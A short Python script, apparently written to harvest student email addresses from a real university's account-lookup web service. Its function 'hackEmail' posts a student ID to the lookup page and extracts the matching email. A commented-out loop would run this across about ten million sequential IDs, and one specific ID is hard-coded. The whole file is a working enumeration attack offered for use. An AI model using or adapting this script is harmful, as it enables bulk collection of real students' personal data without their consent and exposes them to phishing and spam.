# a script to get all students campus wide number and their full name from the website
import requests
from bs4 import BeautifulSoup as bs
from urllib.request import urlopen
from urllib import parse, request
import lxml


def hackEmail(cwid):
  # base url
  BASE_URL = "https://webservices.ulm.edu/uportal_content/account_lookup_rp.php"

  # get website context
  context = urlopen(BASE_URL)
  # delattr
  data = bs(context, "lxml")
  # post data 

  push_data = {"cwid": str(cwid)}

  # encode the data
  encoded_data = parse.urlencode(push_data).encode()
  # post the data to the website and get response
  req =  request.Request(BASE_URL, data=encoded_data)
  # This will contain the response page
  with request.urlopen(req) as resp:
      # Reads and decodes the body response data
      # Note: You will need to specify the correct response encoding
      #       if it is not utf-8
      body_data = resp.read().decode('utf-8')
  # now extract email or username from the website data

  alist = body_data.split("\n")
  for a in alist:
    if "email address" in a:
      single = a.replace(">", "\n")
      double = single.replace("<", "\n")
      alist = double.split("\n")
      for email in alist:
        if "@warhawks.ulm.edu" in email:
          print(str(cwid) + " - " + email)

# for number in range(30110000, 40000000):
#   hackEmail(number)
hackEmail(30113343)
